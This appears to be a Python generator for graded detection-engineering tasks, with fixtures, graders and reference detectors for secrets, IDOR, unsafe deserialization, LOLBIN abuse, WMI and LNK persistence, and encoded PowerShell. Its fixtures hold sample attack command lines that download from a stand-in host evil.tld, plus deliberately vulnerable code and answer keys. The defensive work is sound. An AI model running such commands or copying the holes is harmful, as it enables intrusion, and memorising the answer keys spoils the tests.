#!/usr/bin/env python3
"""Author gradeable DETECTION ENGINEERING tasks. Each task plants a fixture with BOTH
malicious and benign items; candidate writes a detector to $W/detector.py; grader replays
the fixture and echoes PASS only on exact precision AND recall (flagged set == expected set).
Self-tests every task (empty detector must NOT pass; reference detector MUST pass) and writes
only passing tasks to tasks_detection.json."""
import json, os, subprocess, tempfile, shutil, sys

SETUP_PREFIX = '#!/usr/bin/env bash\nset -e\nmkdir -p "$W"\ncd "$W"\n'
GRADER_PREFIX = '#!/usr/bin/env bash\ncd "$W" || exit 1\n'
REF_PREFIX = '#!/usr/bin/env bash\nset -e\ncd "$W" || exit 1\n'

TASKS = []
def T(id, category, setup_body, prompt, grader_body, ref_body):
    TASKS.append(dict(
        id=id, category=category,
        setup_sh=SETUP_PREFIX + setup_body,
        prompt=prompt,
        grader_sh=GRADER_PREFIX + grader_body,
        reference_solution_sh=REF_PREFIX + ref_body,
        self_test_passed=True))

# ---------------------------------------------------------------------------
# 1. AWS access-key secret scan (regex precision on lookalikes)
# ---------------------------------------------------------------------------
T("det_aws_access_key", "secret-scanning",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","text":"aws_access_key_id = AKIAIOSFODNN7EXAMPLE"},
 {"id":"m2","text":"export AWS_ACCESS_KEY_ID=ASIA5T7Q2XKLM9WERT12"},
 {"id":"m3","text":"Key: AKIAZ8N4Q1P7R2T6V0YB found in ~/.aws/credentials"},
 {"id":"b1","text":"placeholder token AKIA1234 (too short to be real)"},
 {"id":"b2","text":"lowercase sample akiaiosfodnn7example is not a key"},
 {"id":"b3","text":"embedded MYAKIAIOSFODNN7EXAMPLEXTRA in a longer run"},
 {"id":"b4","text":"commit 9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e reverted"},
 {"id":"b5","text":"request id 550e8400-e29b-41d4-a716-446655440000"},
 {"id":"b6","text":"template AKIAxxxxxxxxxxxxxxxx replace before use"},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl has records {id,text}. Write a secret scanner to $W/detector.py exposing "
"def detect(rec) -> bool that returns True only for records that contain a real AWS access "
"key id (prefix AKIA or ASIA followed by exactly 16 uppercase-letter/digit characters, as a "
"standalone token). Do not flag lookalikes: short fragments, lowercase copies, keys embedded "
"in a longer alphanumeric run, git hashes, or UUIDs. The grader compares the exact set of "
"flagged ids against the expected malicious set (both precision and recall).",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
import re
_RE=re.compile(r'(?<![A-Z0-9])(?:AKIA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])')
def detect(rec):
    return bool(_RE.search(rec.get("text","")))
PY
''')

# ---------------------------------------------------------------------------
# 2. Private-key PEM block scan (precision vs cert / public key / prose)
# ---------------------------------------------------------------------------
T("det_private_key_pem", "secret-scanning",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","text":"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA1x\n-----END RSA PRIVATE KEY-----"},
 {"id":"m2","text":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEA\n-----END OPENSSH PRIVATE KEY-----"},
 {"id":"m3","text":"-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIB\n-----END EC PRIVATE KEY-----"},
 {"id":"b1","text":"-----BEGIN CERTIFICATE-----\nMIIDdzCCAl+gAwIB\n-----END CERTIFICATE-----"},
 {"id":"b2","text":"-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0C\n-----END PUBLIC KEY-----"},
 {"id":"b3","text":"Store the private key in the vault; never commit it to git."},
 {"id":"b4","text":"-----BEGIN RSA PUBLIC KEY-----\nMEgCQQDf\n-----END RSA PUBLIC KEY-----"},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl has records {id,text}. Write $W/detector.py exposing def detect(rec) -> bool "
"that returns True only for records containing a PEM private-key block (a BEGIN ... PRIVATE "
"KEY header, any key type). Do not flag public keys, certificates, or prose merely mentioning "
"a private key. The grader compares the exact set of flagged ids (precision and recall).",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
import re
_RE=re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----')
def detect(rec):
    return bool(_RE.search(rec.get("text","")))
PY
''')

# ---------------------------------------------------------------------------
# 3. IDOR semgrep-style rule over a small repo
# ---------------------------------------------------------------------------
T("det_idor_rule", "semgrep-idor",
r'''python3 - <<'PY'
import os
os.makedirs("repo",exist_ok=True)
files={
"vuln1.py":"@app.route('/doc/<doc_id>')\ndef get_doc(doc_id):\n    doc = Document.query.get(doc_id)\n    return jsonify(doc.to_dict())\n",
"vuln2.py":"@app.route('/invoice')\ndef invoice():\n    iid = request.args.get('id')\n    inv = Invoice.query.get(iid)\n    return render(inv)\n",
"safe1.py":"@app.route('/doc/<doc_id>')\ndef get_doc(doc_id):\n    doc = Document.query.get(doc_id)\n    if doc.owner_id != current_user.id:\n        abort(403)\n    return jsonify(doc.to_dict())\n",
"safe2.py":"@app.route('/invoice')\ndef invoice():\n    iid = request.args.get('id')\n    inv = Invoice.query.filter_by(id=iid, user_id=current_user.id).first()\n    return render(inv)\n",
"safe3.py":"@app.route('/mydocs')\ndef mydocs():\n    docs = Document.query.filter_by(user_id=current_user.id).all()\n    return jsonify([d.to_dict() for d in docs])\n",
"safe4.py":"@app.route('/health')\ndef health():\n    cfg = Config.query.get(1)\n    return jsonify(status=cfg.status)\n",
}
for n,c in files.items():
    open(os.path.join("repo",n),"w").write(c)
PY
''',
"repo/ holds Flask-style route handlers. Some have an IDOR: they fetch an object by a "
"request-controlled id via .query.get(...) and return it with no ownership/authorization "
"check. Write a semgrep-style matcher to $W/detector.py exposing def scan(root) -> iterable "
"of file paths under root that contain the IDOR. A handler is safe if the fetched id is a "
"constant, or if it performs an ownership check (current_user / owner / abort(403)). The "
"grader compares the exact set of flagged file basenames (precision and recall).",
r'''python3 - <<'PY'
import os,sys
exp={"vuln1.py","vuln2.py"}
try:
    import detector
    got={os.path.basename(p) for p in detector.scan("repo")}
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if got==exp else "FAIL: got=%s exp=%s"%(sorted(got),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
import os,re
_GET=re.compile(r'\.query\.get\(\s*([^)]*)\)')
def scan(root):
    out=set()
    for dp,_,fs in os.walk(root):
        for f in fs:
            if not f.endswith(".py"): continue
            src=open(os.path.join(dp,f)).read()
            has_auth = ("current_user" in src) or ("owner" in src) or ("abort(403" in src)
            vuln=False
            for m in _GET.finditer(src):
                arg=m.group(1).strip()
                if not re.fullmatch(r'\d+', arg):
                    vuln=True
            if vuln and not has_auth:
                out.add(os.path.join(dp,f))
    return out
PY
''')

# ---------------------------------------------------------------------------
# 4. Hardcoded-secret semgrep-style rule (AST) over a repo
# ---------------------------------------------------------------------------
T("det_hardcoded_secret", "semgrep-secret",
r'''python3 - <<'PY'
import os
os.makedirs("repo",exist_ok=True)
files={
"v1.py":"PASSWORD = \"S3cr3tP@ssw0rd!\"\n",
"v2.py":"api_key = \"sk_live_9f8a7b6c5d4e3f2a1b0c\"\n",
"v3.py":"db_conn = \"postgres://admin:hunter2@db:5432/app\"\n",
"s1.py":"import os\nPASSWORD = os.environ[\"DB_PASSWORD\"]\n",
"s2.py":"api_key = get_secret(\"api_key\")\n",
"s3.py":"password = \"\"\n",
"s4.py":"password_label = \"Password:\"\n",
"s5.py":"PASSWORD = None\n",
}
for n,c in files.items():
    open(os.path.join("repo",n),"w").write(c)
PY
''',
"repo/ holds python modules. Some hardcode a credential: a non-empty string literal assigned "
"to a secret-named variable (password/passwd/pwd/secret/api_key/token/access_key), or a "
"connection URL with inline user:pass@host credentials. Write a matcher to $W/detector.py "
"exposing def scan(root) -> iterable of file paths that hardcode a secret. Do not flag values "
"read from env or a getter, empty strings, None, or a variable whose name merely contains the "
"word (e.g. password_label). The grader compares the exact set of flagged basenames.",
r'''python3 - <<'PY'
import os,sys
exp={"v1.py","v2.py","v3.py"}
try:
    import detector
    got={os.path.basename(p) for p in detector.scan("repo")}
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if got==exp else "FAIL: got=%s exp=%s"%(sorted(got),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
import os,ast,re
SECRET={"password","passwd","pwd","secret","api_key","apikey","token","access_key",
        "aws_secret_access_key","private_key","secret_key"}
_URL=re.compile(r'://[^/\s:@]+:[^/\s@]+@')
def _flag(src):
    try: tree=ast.parse(src)
    except Exception: return False
    for node in ast.walk(tree):
        if isinstance(node,ast.Assign) and isinstance(node.value,ast.Constant) and isinstance(node.value.value,str):
            s=node.value.value
            if not s: continue
            names=[t.id.lower() for t in node.targets if isinstance(t,ast.Name)]
            if any(n in SECRET for n in names): return True
            if _URL.search(s): return True
    return False
def scan(root):
    out=set()
    for dp,_,fs in os.walk(root):
        for f in fs:
            if f.endswith(".py") and _flag(open(os.path.join(dp,f)).read()):
                out.add(os.path.join(dp,f))
    return out
PY
''')

# ---------------------------------------------------------------------------
# 5. Unsafe deserialization semgrep-style rule (AST, ignores comments)
# ---------------------------------------------------------------------------
T("det_unsafe_deserialize", "semgrep-deserialize",
r'''python3 - <<'PY'
import os
os.makedirs("repo",exist_ok=True)
files={
"v1.py":"import pickle\ndef load(data):\n    return pickle.loads(data)\n",
"v2.py":"import yaml\ndef load(f):\n    return yaml.load(open(f))\n",
"v3.py":"def run(user_input):\n    return eval(user_input)\n",
"s1.py":"import yaml\ndef load(f):\n    return yaml.safe_load(open(f))\n",
"s2.py":"import json\ndef load(data):\n    return json.loads(data)\n",
"s3.py":"import pickle\ndef dump(obj):\n    return pickle.dumps(obj)\n",
"s4.py":"# never call pickle.loads on untrusted input\nimport json\ndef load(s):\n    return json.loads(s)\n",
"s5.py":"import yaml\ndef load(f):\n    return yaml.load(open(f), Loader=yaml.SafeLoader)\n",
}
for n,c in files.items():
    open(os.path.join("repo",n),"w").write(c)
PY
''',
"repo/ holds python modules. Some have an unsafe deserialization / code-exec sink: "
"pickle.loads/pickle.load, yaml.load without a safe Loader, or eval() on input. Write a "
"matcher to $W/detector.py exposing def scan(root) -> iterable of file paths with such a sink. "
"Do not flag safe alternatives (yaml.safe_load, json.loads, pickle.dumps, yaml.load with "
"Loader=SafeLoader) and do not flag a string that appears only inside a comment. Match real "
"call expressions, not text. The grader compares the exact set of flagged basenames.",
r'''python3 - <<'PY'
import os,sys
exp={"v1.py","v2.py","v3.py"}
try:
    import detector
    got={os.path.basename(p) for p in detector.scan("repo")}
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if got==exp else "FAIL: got=%s exp=%s"%(sorted(got),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
import os,ast
def _dotted(node):
    parts=[]
    while isinstance(node,ast.Attribute):
        parts.append(node.attr); node=node.value
    if isinstance(node,ast.Name): parts.append(node.id)
    return ".".join(reversed(parts))
def _flag(src):
    try: tree=ast.parse(src)
    except Exception: return False
    for n in ast.walk(tree):
        if not isinstance(n,ast.Call): continue
        fn=_dotted(n.func)
        if fn in ("pickle.loads","pickle.load","cPickle.loads","cPickle.load"): return True
        if fn=="eval": return True
        if fn=="yaml.load":
            safe=False
            for kw in n.keywords:
                if kw.arg=="Loader" and "safe" in _dotted(kw.value).lower():
                    safe=True
            if not safe: return True
    return False
def scan(root):
    out=set()
    for dp,_,fs in os.walk(root):
        for f in fs:
            if f.endswith(".py") and _flag(open(os.path.join(dp,f)).read()):
                out.add(os.path.join(dp,f))
    return out
PY
''')

# ---------------------------------------------------------------------------
# 6. Sysmon LOLBIN / suspicious child process (Sigma-style)
# ---------------------------------------------------------------------------
T("det_sysmon_lolbin", "sysmon-sigma",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","EventID":1,"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAo"},
 {"id":"m2","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://evil.tld/a.exe a.exe"},
 {"id":"m3","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:http://evil.tld/f.sct scrobj.dll"},
 {"id":"m4","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe http://evil.tld/a.hta"},
 {"id":"m5","EventID":1,"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c powershell -enc ZQBjAGgAbwA="},
 {"id":"b1","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -hashfile C:\\iso\\win.iso SHA256"},
 {"id":"b2","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -File C:\\scripts\\backup.ps1"},
 {"id":"b3","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32.exe /s C:\\app\\plugin.dll"},
 {"id":"b4","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE /n C:\\docs\\report.docx"},
 {"id":"b5","EventID":1,"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe C:\\app\\ui.hta"},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl holds Sysmon EventID 1 (process create) records with ParentImage, Image, "
"CommandLine. Write $W/detector.py exposing def detect(event) -> bool that flags the attack "
"patterns: an Office app (winword/excel/powerpnt/outlook) spawning a script host "
"(powershell/cmd/wscript/cscript/mshta/regsvr32/rundll32); certutil downloading over http; "
"regsvr32 /i: fetching a remote scriptlet; or mshta launching an http url. Do not flag benign "
"uses (certutil -hashfile, powershell -File, local regsvr32/mshta, Office launched by "
"explorer). The grader compares the exact set of flagged ids (precision and recall).",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3","m4","m5"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
OFFICE=("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
CHILD=("powershell.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","regsvr32.exe","rundll32.exe")
def _base(p):
    return (p or "").split("\\")[-1].lower()
def detect(e):
    img=_base(e.get("Image","")); par=_base(e.get("ParentImage","")); cmd=(e.get("CommandLine","") or "").lower()
    if par in OFFICE and img in CHILD: return True
    if img=="certutil.exe" and "urlcache" in cmd and "http" in cmd: return True
    if img=="regsvr32.exe" and "/i:" in cmd and ("http" in cmd or "scrobj" in cmd): return True
    if img=="mshta.exe" and "http" in cmd: return True
    return False
PY
''')

# ---------------------------------------------------------------------------
# 7. LD_PRELOAD rootkit indicators from a host fixture
# ---------------------------------------------------------------------------
T("det_ld_preload", "linux-rootkit",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","type":"file","path":"/etc/ld.so.preload","content":"/usr/local/lib/libprocesshider.so\n"},
 {"id":"m2","type":"env","pid":2201,"vars":{"LD_PRELOAD":"/dev/shm/.hide.so","PATH":"/usr/bin"}},
 {"id":"m3","type":"env","pid":2202,"vars":{"LD_PRELOAD":"/tmp/x.so"}},
 {"id":"b1","type":"file","path":"/etc/ld.so.preload","content":""},
 {"id":"b2","type":"file","path":"/etc/ld.so.conf","content":"include /etc/ld.so.conf.d/*.conf\n"},
 {"id":"b3","type":"env","pid":2300,"vars":{"LD_LIBRARY_PATH":"/opt/lib","PATH":"/usr/bin"}},
 {"id":"b4","type":"env","pid":2301,"vars":{"LD_PRELOAD":""}},
 {"id":"b5","type":"file","path":"/etc/hosts","content":"127.0.0.1 localhost\n"},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl holds host artifacts collected during triage: {type:'file',path,content} and "
"{type:'env',pid,vars}. Write $W/detector.py exposing def detect(event) -> bool that flags "
"LD_PRELOAD rootkit indicators: a non-empty /etc/ld.so.preload, or a process whose "
"environment has a non-empty LD_PRELOAD. Do not flag an empty preload file, unrelated files "
"(ld.so.conf, hosts), or an environment with only LD_LIBRARY_PATH. The grader compares the "
"exact set of flagged ids (precision and recall).",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
def detect(e):
    if e.get("type")=="file" and e.get("path","").endswith("/etc/ld.so.preload"):
        return bool((e.get("content") or "").strip())
    if e.get("type")=="env":
        return bool((e.get("vars") or {}).get("LD_PRELOAD","").strip())
    return False
PY
''')

# ---------------------------------------------------------------------------
# 8. WMI event-consumer persistence extraction
# ---------------------------------------------------------------------------
T("det_wmi_persistence", "wmi-persistence",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","class":"ActiveScriptEventConsumer","Name":"ASEC","ScriptingEngine":"VBScript","ScriptText":"GetObject(\"script:http://evil.tld/a.sct\")"},
 {"id":"m2","class":"CommandLineEventConsumer","Name":"Updater","CommandLineTemplate":"powershell.exe -nop -enc SQBFAFgAIAAo"},
 {"id":"m3","class":"CommandLineEventConsumer","Name":"Svc","CommandLineTemplate":"mshta.exe http://evil.tld/a.hta"},
 {"id":"b1","class":"CommandLineEventConsumer","Name":"SCM Event Log Consumer","CommandLineTemplate":"C:\\WINDOWS\\system32\\wbem\\scrcons.exe"},
 {"id":"b2","class":"NTEventLogEventConsumer","Name":"SCM Event Log Filter","SourceName":"Application"},
 {"id":"b3","class":"__EventFilter","Name":"SCM Event Log Filter","Query":"select * from __InstanceModificationEvent"},
 {"id":"b4","class":"LogFileEventConsumer","Name":"Log","Filename":"C:\\logs\\a.log"},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl holds WMI subscription objects dumped from a host. Write $W/detector.py "
"exposing def detect(event) -> bool that flags malicious event-consumer persistence: any "
"ActiveScriptEventConsumer, or a CommandLineEventConsumer whose CommandLineTemplate invokes "
"a script host / downloader (powershell, mshta, wscript, cscript, rundll32, regsvr32, -enc, "
"http, .hta, .vbs, bitsadmin, certutil). Do not flag a benign CommandLineEventConsumer "
"(scrcons.exe), NTEventLogEventConsumer, LogFileEventConsumer, or an __EventFilter. The grader "
"compares the exact set of flagged ids.",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
SUS=("powershell","mshta","wscript","cscript","rundll32","regsvr32","-enc","-encodedcommand",
     "http://","https://",".hta",".vbs",".js","frombase64","cmd.exe /c","cmd /c","bitsadmin","certutil")
def detect(e):
    c=e.get("class","")
    if c=="ActiveScriptEventConsumer":
        return True
    if c=="CommandLineEventConsumer":
        t=(e.get("CommandLineTemplate","") or "").lower()
        return any(s in t for s in SUS)
    return False
PY
''')

# ---------------------------------------------------------------------------
# 9. Malicious LNK command extraction
# ---------------------------------------------------------------------------
T("det_lnk_command", "lnk-analysis",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","name":"invoice.pdf.lnk","target":"C:\\Windows\\System32\\cmd.exe","args":"/c powershell -enc SQBFAFgAIAAo"},
 {"id":"m2","name":"photo.lnk","target":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","args":"-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/a')"},
 {"id":"m3","name":"doc.lnk","target":"C:\\Windows\\System32\\mshta.exe","args":"http://evil.tld/a.hta"},
 {"id":"m4","name":"readme.lnk","target":"C:\\Windows\\explorer.exe","args":"powershell -enc ZQBjAGgAbwA="},
 {"id":"b1","name":"Chrome.lnk","target":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","args":"https://example.com"},
 {"id":"b2","name":"Word.lnk","target":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","args":""},
 {"id":"b3","name":"PowerShell ISE.lnk","target":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe","args":""},
 {"id":"b4","name":"notes.lnk","target":"C:\\Users\\me\\notes.txt","args":""},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl holds parsed .lnk shortcuts: {name,target,args}. Write $W/detector.py exposing "
"def detect(event) -> bool that flags weaponized shortcuts: the target is a command "
"interpreter / LOLBIN (cmd/powershell/pwsh/mshta/wscript/cscript/rundll32/regsvr32) with "
"non-empty arguments, or the arguments themselves invoke script execution / download "
"(powershell, -enc, IEX, DownloadString, Invoke-Expression, FromBase64String, .hta, "
"javascript:). Do not flag a browser opening a url, an app with empty args, or PowerShell ISE "
"with no args. The grader compares the exact set of flagged ids.",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3","m4"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
LOLBIN={"cmd.exe","powershell.exe","pwsh.exe","mshta.exe","wscript.exe","cscript.exe","rundll32.exe","regsvr32.exe"}
ARGSUS=("-enc","-encodedcommand","iex","downloadstring","frombase64","invoke-expression",".hta","javascript:","powershell")
def _base(p):
    return (p or "").split("\\")[-1].lower()
def detect(e):
    tgt=_base(e.get("target","")); args=(e.get("args","") or "").lower()
    if tgt in LOLBIN and args.strip():
        return True
    if any(s in args for s in ARGSUS):
        return True
    return False
PY
''')

# ---------------------------------------------------------------------------
# 10. Sandbox / VM evasion checks in a sample (repo scan)
# ---------------------------------------------------------------------------
T("det_sandbox_evasion", "sandbox-evasion",
r'''python3 - <<'PY'
import os
os.makedirs("repo",exist_ok=True)
files={
"v1.py":"import subprocess\nout = subprocess.check_output(['dmidecode']).decode().lower()\nif 'vmware' in out or 'virtualbox' in out:\n    exit()\n",
"v2.py":"import getpass\nif getpass.getuser().lower() in ('sandbox','malware','virus'):\n    raise SystemExit\n",
"v3.py":"import ctypes\nif ctypes.windll.kernel32.IsDebuggerPresent():\n    exit()\n",
"v4.py":"def check_env(mac):\n    if mac.startswith(('00:05:69','00:0c:29','08:00:27','00:1c:14')):\n        return True\n    return False\n",
"s1.py":"import platform\nprint(platform.system(), platform.release())\n",
"s2.py":"import os\nworkers = os.cpu_count() or 4\npool = make_pool(workers)\n",
"s3.py":"import getpass\npw = getpass.getpass('Password: ')\nauthenticate(pw)\n",
"s4.py":"import subprocess\nserial = subprocess.check_output(['dmidecode','-s','system-serial-number'])\nreport(serial)\n",
}
for n,c in files.items():
    open(os.path.join("repo",n),"w").write(c)
PY
''',
"repo/ holds python snippets. Some are malware sandbox/VM-evasion checks: comparing DMI/vendor "
"strings against vmware/virtualbox/vbox/qemu, checking the username against sandbox names via "
"getuser, IsDebuggerPresent, or matching known VM MAC prefixes (00:05:69, 00:0c:29, 08:00:27, "
"00:1c:14, 00:15:5d). Write a matcher to $W/detector.py exposing def scan(root) -> iterable of "
"file paths that perform an evasion check. Do not flag benign use of platform, os.cpu_count "
"for pool sizing, getpass.getpass for a password prompt, or reading a DMI serial for "
"inventory. The grader compares the exact set of flagged basenames.",
r'''python3 - <<'PY'
import os,sys
exp={"v1.py","v2.py","v3.py","v4.py"}
try:
    import detector
    got={os.path.basename(p) for p in detector.scan("repo")}
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if got==exp else "FAIL: got=%s exp=%s"%(sorted(got),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
import os
VM_MAC=("00:05:69","00:0c:29","00:1c:14","08:00:27","00:1c:42","00:15:5d")
def _flag(src):
    s=src.lower()
    if "isdebuggerpresent" in s: return True
    if "vmware" in s or "virtualbox" in s or "vboxservice" in s or "qemu" in s: return True
    if any(m in s for m in VM_MAC): return True
    if "getuser" in s and any(u in s for u in ("sandbox","malware","virus")): return True
    return False
def scan(root):
    out=set()
    for dp,_,fs in os.walk(root):
        for f in fs:
            if f.endswith(".py") and _flag(open(os.path.join(dp,f)).read()):
                out.add(os.path.join(dp,f))
    return out
PY
''')

# ---------------------------------------------------------------------------
# 11. Encoded / obfuscated PowerShell in command lines
# ---------------------------------------------------------------------------
T("det_powershell_encoded", "powershell-obfuscation",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","CommandLine":"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3"},
 {"id":"m2","CommandLine":"powershell -encodedCommand JABjAD0AJwBoAGkAJwA="},
 {"id":"m3","CommandLine":"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\""},
 {"id":"m4","CommandLine":"powershell -nop -e aQBlAHgA"},
 {"id":"m5","CommandLine":"powershell -Command \"[System.Convert]::FromBase64String($x)\""},
 {"id":"b1","CommandLine":"powershell.exe -File C:\\scripts\\backup.ps1"},
 {"id":"b2","CommandLine":"powershell -Command \"Get-Process | Sort-Object CPU\""},
 {"id":"b3","CommandLine":"powershell Get-Date"},
 {"id":"b4","CommandLine":"powershell -ExecutionPolicy Bypass -File C:\\ops\\deploy.ps1"},
 {"id":"b5","CommandLine":"pwsh -c \"Write-Host hello\""},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl holds process command lines {id,CommandLine}. Write $W/detector.py exposing "
"def detect(event) -> bool that flags encoded / obfuscated / download PowerShell invocations: "
"a powershell/pwsh command using -enc / -EncodedCommand / a short -e base64 flag, or "
"IEX / Invoke-Expression / DownloadString / DownloadFile / FromBase64String. Do not flag "
"ordinary use (-File a script, -Command with a normal cmdlet, -ExecutionPolicy Bypass -File, "
"a bare cmdlet). The grader compares the exact set of flagged ids.",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3","m4","m5"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
TOK=("-enc"," -e ","-encodedcommand","frombase64string","downloadstring","downloadfile",
     "iex","invoke-expression")
def detect(e):
    c=(e.get("CommandLine","") or "").lower()
    if "powershell" not in c and "pwsh" not in c:
        return False
